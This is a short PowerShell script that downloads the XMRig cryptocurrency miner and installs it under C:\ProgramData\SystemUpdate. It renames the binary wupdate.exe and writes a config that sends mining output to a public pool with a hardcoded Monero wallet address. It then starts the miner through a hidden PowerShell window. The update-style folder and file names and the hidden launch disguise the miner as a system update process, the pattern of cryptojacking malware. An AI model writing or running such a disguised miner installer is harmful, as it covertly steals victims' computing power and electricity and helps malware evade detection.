# XMRig Deploy - Simple & Reliable Version (English only)
$installPath = "C:\ProgramData\SystemUpdate"

New-Item -ItemType Directory -Path $installPath -Force | Out-Null

# Download and extract
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$zipPath = "$installPath\xmrig.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
Remove-Item $zipPath -Force

Copy-Item "$installPath\xmrig-6.25.0\xmrig.exe" "$installPath\wupdate.exe" -Force

# Create config with .NET (most reliable)
$configPath = "$installPath\config.json"
$configJson = '{
    "autosave": true,
    "cpu": { "max-threads-hint": 50 },
    "pools": [{
        "url": "pool.supportxmr.com:3333",
        "user": "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd",
        "pass": "x",
        "keepalive": true,
        "tls": false
    }],
    "background": false,
    "log-file": null
}'
[System.IO.File]::WriteAllText($configPath, $configJson, [System.Text.Encoding]::UTF8)

# Launch miner - change to its folder and run in background
$exePath = "$installPath\wupdate.exe"

Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"Set-Location '$installPath'; & '$exePath' -B -c config.json`"" `
    -WindowStyle Hidden

# Small delay to let it start
Start-Sleep -Seconds 8

Write-Output "Deployment finished. Check Task Manager for wupdate.exe"
